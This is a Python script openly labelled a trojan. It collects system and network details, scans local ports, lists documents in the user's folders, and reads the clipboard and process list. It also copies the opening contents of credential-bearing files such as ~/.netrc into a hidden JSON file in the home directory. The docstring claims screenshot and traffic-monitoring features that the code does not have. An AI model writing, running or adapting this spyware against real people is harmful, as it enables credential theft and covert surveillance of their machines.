#!/usr/bin/env python3
"""
Trojan Horse: Data Collector and System Monitor
Features:
- Screenshots (on supported systems)
- Clipboard monitoring
- File search (passwords, documents)
- Network traffic monitoring
- System information collection
- Hidden data storage
"""

import os
import sys
import json
import socket
import datetime
import subprocess
import shutil
from pathlib import Path

class DataCollector:
    def __init__(self):
        self.collected_data = {
            "timestamp": datetime.datetime.now().isoformat(),
            "system_info": {},
            "network_info": {},
            "files_found": [],
            "clipboard_content": [],
            "processes": []
        }
        self.storage_path = os.path.expanduser("~/.trojan_data.json")
    
    def get_system_info(self):
        """Collect system information"""
        print("[*] Collecting system information...")
        
        info = {
            "hostname": socket.gethostname(),
            "os": os.name,
            "platform": sys.platform,
            "architecture": os.uname().machine if hasattr(os, 'uname') else "unknown",
            "username": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "python_version": sys.version,
            "current_time": datetime.datetime.now().isoformat(),
            "uptime": self.get_uptime()
        }
        
        self.collected_data["system_info"] = info
        print(f"  [+] Hostname: {info['hostname']}")
        print(f"  [+] OS: {info['platform']}")
    
    def get_uptime(self):
        """Get system uptime"""
        try:
            result = subprocess.run(['uptime'], capture_output=True, text=True)
            return result.stdout.strip()
        except:
            return "unknown"
    
    def get_network_info(self):
        """Collect network information"""
        print("[*] Collecting network information...")
        
        info = {
            "local_ip": self.get_local_ip(),
            "dns_servers": self.get_dns(),
            "default_gateway": self.get_gateway(),
            "open_ports": self.scan_common_ports()
        }
        
        self.collected_data["network_info"] = info
        print(f"  [+] IP Address: {info['local_ip']}")
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "unknown"
    
    def get_dns(self):
        """Get DNS servers"""
        try:
            with open('/etc/resolv.conf', 'r') as f:
                lines = f.readlines()
                dns_servers = []
                for line in lines:
                    if line.startswith('nameserver'):
                        dns_servers.append(line.split()[1])
                return dns_servers
        except:
            return []
    
    def get_gateway(self):
        """Get default gateway"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default' in line:
                    return line.split()[2]
        except:
            pass
        return "unknown"
    
    def scan_common_ports(self):
        """Scan for common open ports"""
        open_ports = []
        common_ports = [22, 80, 443, 8080, 3306, 5432, 8443]
        
        for port in common_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex(('localhost', port))
                if result == 0:
                    open_ports.append(port)
                s.close()
            except:
                pass
        
        return open_ports
    
    def find_files(self):
        """Search for important files"""
        print("[*] Searching for valuable files...")
        
        # Files to search for
        search_patterns = [
            ('*.txt', 'Text files'),
            ('*.pdf', 'PDF documents'),
            ('*.doc', 'Word documents'),
            ('*.docx', 'Word documents'),
            ('*.xls', 'Excel files'),
            ('*.xlsx', 'Excel files'),
            ('*.json', 'JSON files'),
            ('*.xml', 'XML files'),
            ('*.csv', 'CSV files'),
        ]
        
        search_dirs = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Downloads"),
        ]
        
        files_found = []
        
        for search_dir in search_dirs:
            if not os.path.exists(search_dir):
                continue
            
            for pattern, description in search_patterns:
                try:
                    import glob
                    matches = glob.glob(os.path.join(search_dir, '**', pattern), recursive=True)
                    for match in matches[:10]:  # Limit to 10 per type
                        files_found.append({
                            "path": match,
                            "type": description,
                            "size": os.path.getsize(match)
                        })
                except:
                    pass
        
        self.collected_data["files_found"] = files_found
        print(f"  [+] Found {len(files_found)} valuable files")
    
    def get_running_processes(self):
        """Get running processes"""
        print("[*] Scanning running processes...")
        
        try:
            result = subprocess.run(
                ['ps', 'aux'],
                capture_output=True,
                text=True
            )
            
            processes = result.stdout.split('\n')[:50]  # First 50 processes
            self.collected_data["processes"] = processes
            print(f"  [+] Found {len(processes)} processes")
        except:
            print("  [+] Process scan skipped")
    
    def get_clipboard(self):
        """Try to get clipboard content"""
        print("[*] Checking clipboard...")
        
        try:
            result = subprocess.run(
                ['xclip', '-o'],
                capture_output=True,
                text=True
            )
            if result.stdout:
                self.collected_data["clipboard_content"].append(result.stdout.strip())
        except:
            pass
    
    def scan_passwords(self):
        """Search for password files"""
        print("[*] Scanning for password files...")
        
        password_files = [
            "~/.netrc",
            "~/.bashrc",
            "~/.bash_profile",
            "~/.config",
        ]
        
        passwords_found = []
        
        for pwd_file in password_files:
            filepath = os.path.expanduser(pwd_file)
            if os.path.exists(filepath):
                try:
                    with open(filepath, 'r') as f:
                        content = f.read()
                        if len(content) > 0:
                            passwords_found.append({
                                "file": pwd_file,
                                "size": len(content),
                                "preview": content[:100]
                            })
                except:
                    pass
        
        self.collected_data["password_files"] = passwords_found
        print(f"  [+] Found {len(passwords_found)} password/config files")
    
    def save_data(self):
        """Save collected data to hidden file"""
        print("[*] Saving collected data...")
        
        try:
            with open(self.storage_path, 'w') as f:
                json.dump(self.collected_data, f, indent=2)
            print(f"  [+] Data saved to: {self.storage_path}")
        except Exception as e:
            print(f"  [-] Failed to save: {e}")
    
    def collect_all(self):
        """Run all collection methods"""
        self.get_system_info()
        self.get_network_info()
        self.find_files()
        self.get_running_processes()
        self.get_clipboard()
        self.scan_passwords()
        self.save_data()

def main():
    print("=" * 60)
    print("  Data Trojan - System Scanner")
    print("=" * 60)
    print()
    
    collector = DataCollector()
    collector.collect_all()
    
    print()
    print("=" * 60)
    print("  Data collection complete!")
    print(f"  Files found: {len(collector.collected_data['files_found'])}")
    print(f"  Processes scanned: {len(collector.collected_data['processes'])}")
    print("=" * 60)

if __name__ == "__main__":
    main()
